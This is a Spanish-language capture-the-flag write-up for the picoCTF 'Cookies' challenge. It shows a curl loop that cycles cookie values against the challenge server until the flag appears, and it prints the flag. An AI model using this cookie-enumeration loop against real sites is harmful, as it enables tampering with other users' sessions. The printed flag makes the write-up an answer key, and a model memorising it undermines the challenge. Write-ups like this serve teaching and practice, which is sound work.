## Descripción: 
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)

**Pistas:**

## Solución:
1. Al parecer esta pagina usa cookies:

![Pasted image 20230319114838](Pasted%20image%2020230319114838.png)

2. Tal parce que la pagina devuelve distintas respuestas dependido el valor de la cookie (el valor de la cookie es un numero entero).

![Pasted image 20230319115223](Pasted%20image%2020230319115223.png)

3. Realizamos un `crul` a la pagina para enviarle distintos valores para la cookie y así obtener la flag:

```bash
┌──(kali㉿kali)-[~]
└─$  for i in {0..20}; do curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
┌──(kali㉿kali)-[~]
└─$
```

### Flag: picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}

## Notas adicionales:
| Comando | Descripción |
| --- | --- |
| curl | Curl es una herramienta de línea de comandos de Linux que sirve para transferir datos hacia o desde un servidor con URL, utilizando cualquiera de los protocolos soportados (HTTP, FTP, POP3, IMAP, SMTP, SCP, SFTP, TFTP, TELNET, LDAP…). |

## Referencias:
-  https://www.xataka.com/basics/que-cookies-que-tipos-hay-que-pasa-desactivas